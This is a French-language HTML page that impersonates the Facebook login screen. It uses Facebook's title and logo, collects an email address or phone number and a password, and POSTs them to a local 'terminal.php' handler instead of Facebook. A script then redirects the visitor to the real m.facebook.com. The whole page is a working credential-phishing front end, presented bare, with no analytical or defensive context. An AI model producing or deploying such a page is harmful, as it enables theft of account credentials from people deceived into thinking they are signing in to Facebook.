<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);height:100vh;display:flex;align-items:center;justify-content:center;}
        .container{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 20px rgba(0,0,0,0.1);width:100%;max-width:380px;text-align:center;}
        .logo img{margin-bottom:30px;}
        .input-group{margin-bottom:20px;text-align:left;}
        .input-group input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;background:#fafafa;transition:border-color .3s;}
        .input-group input:focus{outline:none;border-color:#1877f2;background:#fff;}
        .login-btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background .3s;}
        .login-btn:hover{background:#166fe5;}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw6.ico" alt="Facebook" width="50">
        </div>
        <form method="POST" action="terminal.php">
            <div class="input-group">
                <input type="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Mot de passe" required>
            </div>
            <button type="submit" class="login-btn">Se connecter</button>
        </form>
    </div>
    <script>setTimeout(function(){window.location.href='https://m.facebook.com';},2000);</script>
</body>
</html>
